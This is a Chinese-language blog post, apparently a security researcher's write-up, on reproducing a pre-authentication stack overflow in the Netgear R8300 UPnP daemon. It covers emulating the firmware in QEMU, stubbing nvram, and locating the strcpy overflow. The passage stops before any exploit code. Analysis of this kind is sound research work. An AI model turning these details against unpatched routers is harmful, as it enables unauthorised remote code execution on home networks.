@@ -1,0 +1,1373 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="0zti2a3T69n1U7TLwUhRVYhNLB-zZXfCbFPUZIl_2B0" />
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="RCE,栈溢出,Netgear R8300,UPnP," />
+
+
+
+
+
+
+
+
+
+
+<meta name="keywords" content="RCE,栈溢出,Netgear R8300,UPnP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现">
+<meta property="og:url" content="https://0x43434343.com/2020/08/24/202008241640/index.html">
+<meta property="og:site_name" content="fenix&#39;s blog">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/8e550952463f7fcff87e7b38b426c966492eb944">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/5b8190c0014b87f6a617c4e5379fdf74c5e8dce1">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/267c982d326808388a0f5e471a72947b0d5978aa">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/f5af8483ea13f729a433cbf2b68eda3facaf90c2">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/c32183553e61e3d0c83c4bfd1dd8d34727318d87">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/f631fc52842f3ea0f8ec7daca1f6532a4a266d95">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/7d778d53a2dce04f1a98b98d7d7ca98eddf16f59">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/33f808bbf8f1e2d396d2a397bd474ef294050c64">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/798bc90d7bb764f818869afa4a75e9da51ed98c1">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/15c33c7a76fb7b86d826305701ea63ffcd053393">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/3f02dfdc58e79b046b3beba7bdc616d9526c0513">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/92b5c8b3b170670a493a56a7860444b52fae03b4">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/d7d4839bd8d4034eddfc8fce375dc56f8e4999a6">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/fa07dccc16e8dda68e269f525ca0f50cf285513f">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/8e550952463f7fcff87e7b38b426c966492eb944">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/1b93dd742804ca62c0228aae8d7b9114da416fe7">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/5b9c3c693161b7cfb17749bb0b30f0452a7e7404">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/c64d067ec6b990bb4329e81c163d35d1d001ea3e">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/331a5ac9fab5aa4f90c64fd195ccc065061ae950">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/eee72b7b53f9845fc1f7074558a258d23191e753">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/5da5d4d0c5612b8f83e5613435115328a06fda45">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/a36c0e6bceca8289f9169bc66d7cd08c35e4087a">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/bdd0ce0d34d41a21ac3239a74a2d9fa2fa2b927b">
+<meta property="og:updated_time" content="2021-06-11T03:21:49.901Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现">
+<meta name="twitter:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/8e550952463f7fcff87e7b38b426c966492eb944">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://0x43434343.com/2020/08/24/202008241640/"/>
+
+
+
+
+
+  <title>Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现 | fenix's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">fenix's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://0x43434343.com/2020/08/24/202008241640/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="fenix">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fenix's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-08-24T16:40:41+08:00">
+                2020-08-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/IoT/" itemprop="url" rel="index">
+                    <span itemprop="name">IoT</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  3,748
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  18
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/8e550952463f7fcff87e7b38b426c966492eb944" alt=""></p>
+<a id="more"></a>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>R8300 是 Netgear 旗下的一款三频无线路由，主要在北美发售，官方售价 $229.99。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/5b8190c0014b87f6a617c4e5379fdf74c5e8dce1" alt=""></p>
+<p>2020 年 7 月 31 日，Netgear 官方发布安全公告，在更新版固件 1.0.2.134 中修复了 R8300 的一个未授权 RCE 漏洞<a href="https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211" title="Netgear 官方安全公告" target="_blank" rel="noopener">【1】</a>。2020 年 8 月 18 日，SSD Secure Disclosure 上公开了该漏洞的细节及 EXP<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/" title="漏洞详情" target="_blank" rel="noopener">【2】</a>。</p>
+<p>该漏洞位于路由器的 UPnP 服务中， 由于解析 SSDP 协议数据包的代码存在缺陷，导致未经授权的远程攻击者可以发送特制的数据包使得栈上的 buffer 溢出，进一步控制 PC 执行任意代码。</p>
+<p>回顾了下整个复现流程还是很有趣的，特此记录。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下面先搭建漏洞调试环境。在有设备的情况下，有多种直接获取系统 shell 的方式，如：</p>
+<ol>
+<li>硬件调试接口，如：UART</li>
+<li>历史 RCE 漏洞，如：NETGEAR 多款设备基于堆栈的缓冲区溢出远程执行代码漏洞<a href="https://www.seebug.org/vuldb/ssvid-98253" title="NETGEAR 多款设备基于堆栈的缓冲区溢出远程执行代码漏洞" target="_blank" rel="noopener">【3】</a></li>
+<li>设备自身的后门，Unlocking the Netgear Telnet Console<a href="https://openwrt.org/toh/netgear/telnet.console#for_newer_netgear_routers_that_accept_probe_packet_over_udp_ex2700_r6700_r7000_and_r7500" title="Unlocking the Netgear Telnet Console" target="_blank" rel="noopener">【4】</a></li>
+<li>破解固件检验算法，开启 telnet 或植入反连程序。</li>
+</ol>
+<p>不幸的是，没有设备…</p>
+<p>理论上，只要 CPU 指令集对的上，就可以跑起来，所以我们还可以利用手头的树莓派、路由器摄像头的开发板等来运行。最后一个就是基于 QEMU 的指令翻译，可以在现有平台上模拟 ARM、MIPS、X86、PowerPC、SPARK 等多种架构。</p>
+<h2 id="下载固件"><a href="#下载固件" class="headerlink" title="下载固件"></a>下载固件</h2><p>Netgear 还是很良心的，在官网提供了历史固件下载。</p>
+<p>下载地址：<a href="https://www.netgear.com/support/product/R8300.aspx#download" title="固件下载" target="_blank" rel="noopener">【5】</a></p>
+<p>下载的固件 md5sum 如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c3eb8f8c004d466796a05b4c60503162  R8300-V1.0.2.130_1.0.99.zip - 漏洞版本</span><br><span class="line">abce2193f5f24f743c738d24d36d7717  R8300-V1.0.2.134_1.0.99.zip - 补丁版本</span><br></pre></td></tr></table></figure>
+<p>binwalk 可以正确识别。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜ binwalk R8300-V1.0.2.130_1.0.99.chk</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">58            0x3A            TRX firmware header, little endian, image size: 32653312 bytes, CRC32: 0x5CEAB739, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21AB50, rootfs offset: 0x0</span><br><span class="line">86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5470272 bytes</span><br><span class="line">2206602       0x21AB8A        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 30443160 bytes, 1650 inodes, blocksize: 131072 bytes, created: 2018-12-13 04:36:38</span><br></pre></td></tr></table></figure>
+<p>使用 <code>binwalk  -Me</code> 提取出 Squashfs 文件系统，漏洞程序是 <code>ARMv5</code> 架构，动态链接，且去除了符号表。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  squashfs-root ls</span><br><span class="line">bin   dev   etc   lib   media mnt   opt   proc  sbin  share sys   tmp   usr   var   www</span><br><span class="line">➜  squashfs-root find . -name upnpd</span><br><span class="line">./usr/sbin/upnpd</span><br><span class="line">➜  squashfs-root file ./usr/sbin/upnpd</span><br><span class="line">./usr/sbin/upnpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br></pre></td></tr></table></figure>
+<h2 id="QEMU-模拟"><a href="#QEMU-模拟" class="headerlink" title="QEMU 模拟"></a>QEMU 模拟</h2><p>在基于 QEMU 的固件模拟这块，网上也有一些开源的平台，如比较出名的 firmadyne<a href="https://github.com/firmadyne/firmadyne" title="firmadyne" target="_blank" rel="noopener">【6】</a>、ARM-X<a href="https://github.com/therealsaumil/armx" title="ARM-X" target="_blank" rel="noopener">【7】</a>。不过相比于使用这种集成环境，我更倾向于自己动手，精简但够用。</p>
+<p>相应的技巧在之前的文章 《Vivotek 摄像头远程栈溢出漏洞分析及利用》<a href="https://paper.seebug.org/480/" title="Vivotek 摄像头远程栈溢出漏洞分析及利用" target="_blank" rel="noopener">【8】</a> 也有提及，步骤大同小异。</p>
+<p>在 Host 机上创建一个 tap 接口并分配 IP，启动虚拟机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">sudo ifconfig tap0 192.168.2.1/24</span><br><span class="line">qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure>
+<p>用户名和密码都是 root，为虚拟机分配 IP：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.2.2/24</span><br></pre></td></tr></table></figure>
+<p>这样 Host 和虚拟机就网络互通了，然后挂载 proc、dev，最后 chroot 即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@debian-armhf:~# ls</span><br><span class="line">squashfs-root</span><br><span class="line">root@debian-armhf:~# ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56</span><br><span class="line">          inet addr:192.168.2.2  Bcast:192.168.2.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:96350 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:98424 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:7945287 (7.5 MiB)  TX bytes:18841978 (17.9 MiB)</span><br><span class="line">          Interrupt:47</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback</span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:55 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:55 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:304544 (297.4 KiB)  TX bytes:304544 (297.4 KiB)</span><br><span class="line"></span><br><span class="line">root@debian-armhf:~# mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">root@debian-armhf:~# mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">root@debian-armhf:~# chroot ./squashfs-root/ sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BusyBox v1.7.2 (2018-12-13 12:34:27 CST) built-in shell (ash)</span><br><span class="line">Enter &apos;help&apos; for a list of built-in commands.</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line">uid=0 gid=0(root)</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+<h2 id="修复运行依赖"><a href="#修复运行依赖" class="headerlink" title="修复运行依赖"></a>修复运行依赖</h2><p>直接运行没有任何报错就退出了，服务也没启动。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/267c982d326808388a0f5e471a72947b0d5978aa" alt=""></p>
+<p>经过调试发现是打开文件失败。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/f5af8483ea13f729a433cbf2b68eda3facaf90c2" alt=""></p>
+<p>手动创建 <code>/tmp/var/run</code> 目录，再次运行提示缺少 <code>/dev/nvram</code>。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/c32183553e61e3d0c83c4bfd1dd8d34727318d87" alt=""></p>
+<p>NVRAM( 非易失性 RAM) 用于存储路由器的配置信息，而 upnpd 运行时需要用到其中部分配置信息。在没有硬件设备的情况下，我们可以使用 <code>LD_PRELOAD</code> 劫持以下函数符号。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/f631fc52842f3ea0f8ec7daca1f6532a4a266d95" alt=""></p>
+<p>网上找到一个现成的实现：<a href="https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c" title="nvram hook 库" target="_blank" rel="noopener">【9】</a>，交叉编译：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ armv5l-gcc -Wall -fPIC -shared custom_nvram_r6250.c -o nvram.so</span><br></pre></td></tr></table></figure>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/7d778d53a2dce04f1a98b98d7d7ca98eddf16f59" alt=""></p>
+<p>还是报错，找不到 <code>dlsym</code> 的符号。之所以会用到 <code>dlsym</code>，是因为该库的实现者还同时 hook 了 <code>system</code>、<code>fopen</code>、<code>open</code> 等函数，这对于修复文件缺失依赖，查找命令注入漏洞大有裨益。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/33f808bbf8f1e2d396d2a397bd474ef294050c64" alt=""></p>
+<p><code>/lib/libdl.so.0</code> 导出了该符号。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜ grep -r &quot;dlsym&quot; .</span><br><span class="line">Binary file ./lib/libcrypto.so.1.0.0 matches</span><br><span class="line">Binary file ./lib/libdl.so.0 matches</span><br><span class="line">Binary file ./lib/libhcrypto-samba4.so.5 matches</span><br><span class="line">Binary file ./lib/libkrb5-samba4.so.26 matches</span><br><span class="line">Binary file ./lib/libldb.so.1 matches</span><br><span class="line">Binary file ./lib/libsamba-modules-samba4.so matches</span><br><span class="line">Binary file ./lib/libsqlite3.so.0 matches</span><br><span class="line">grep: ./lib/modules/2.6.36.4brcmarm+: No such file or directory</span><br><span class="line"></span><br><span class="line">➜ readelf -a ./lib/libdl.so.0 | grep dlsym</span><br><span class="line">    26: 000010f0   296 FUNC    GLOBAL DEFAULT    7 dlsym</span><br></pre></td></tr></table></figure>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/798bc90d7bb764f818869afa4a75e9da51ed98c1" alt=""></p>
+<p>可以跑起来了，不过由于缺少配置信息，还是会异常退出。接下来要做的就是根据上面的日志补全配置信息，其实特别希望能有一台 R8300，导出里面的 nvram 配置…</p>
+<p>简单举个例子，<code>upnpd_debug_level</code> 是控制日志级别的，<code>sub_B813()</code> 是输出日志的函数，只要 <code>upnpd_debug_level &gt; sub_B813() 的第一个参数</code>，就可以在终端输出日志。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/15c33c7a76fb7b86d826305701ea63ffcd053393" alt=""></p>
+<p>下面分享一份 nvram 配置，至于为什么这么设置，可以查看对应的汇编代码逻辑（配置的有问题的话很容易触发段错误）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=192.168.2.2</span><br><span class="line">hwver=R8500</span><br><span class="line">friendly_name=R8300</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure>
+<p>upnpd 服务成功运行！</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/3f02dfdc58e79b046b3beba7bdc616d9526c0513" alt=""></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>该漏洞的原理很简单，使用 <code>strcpy()</code> 拷贝导致的缓冲区溢出，来看看调用流程。</p>
+<p>在 <code>sub_1D020()</code> 中使用 <code>recvfrom()</code> 从套接字接受最大长度 <code>0x1fff</code> 的 UDP 报文数据。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/92b5c8b3b170670a493a56a7860444b52fae03b4" alt=""></p>
+<p>在 <code>sub_25E04()</code> 中调用 <code>strcpy()</code> 将以上数据拷贝到大小为 <code>0x634 - 0x58 = 0x5dc</code> 的 buffer。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/d7d4839bd8d4034eddfc8fce375dc56f8e4999a6" alt=""></p>
+<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><p>通过 <code>checksec</code> 可知程序本身只开了 NX 保护，从原漏洞详情得知 R8300 上开了 ASLR。 </p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/fa07dccc16e8dda68e269f525ca0f50cf285513f" alt=""></p>
